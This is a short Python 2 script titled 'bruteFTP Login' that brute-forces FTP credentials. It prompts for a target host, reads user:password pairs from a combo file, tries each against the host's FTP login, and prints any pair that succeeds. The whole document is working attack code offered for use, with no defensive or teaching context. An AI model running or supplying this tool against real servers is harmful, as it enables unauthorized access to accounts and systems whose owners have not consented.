#!/usr/bin/python
import ftplib
import time
from huepy import *

print green("-"*60)
print lightcyan("bruteFTP Login")
print lightcyan("Made By: "+italic("0xB9"))
print green("-"*60)
print ""
time.sleep(1)

host = raw_input(green("Enter A Host-> "))
print ""

def bruteFTP(hostname, comboList):
    c = open(comboList, 'r')
    for line in c.readlines():
        user = line.split(':')[0]
        pwd = line.split(':')[1].strip('\r').strip('\n')
        print run("Testing: "+user+":"+pwd)

        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(user, pwd)
            print "\n"+good(str(hostname)+" FTP Login: "+user+":"+pwd+"\n")
            ftp.quit()
            return (user, pwd)
        except Exception, e:
            pass

    print "\n"+bad("Couldn\'t brute force FTP login...\n")
    return (None, None)

comboList = 'combo.txt'
bruteFTP(host, comboList)
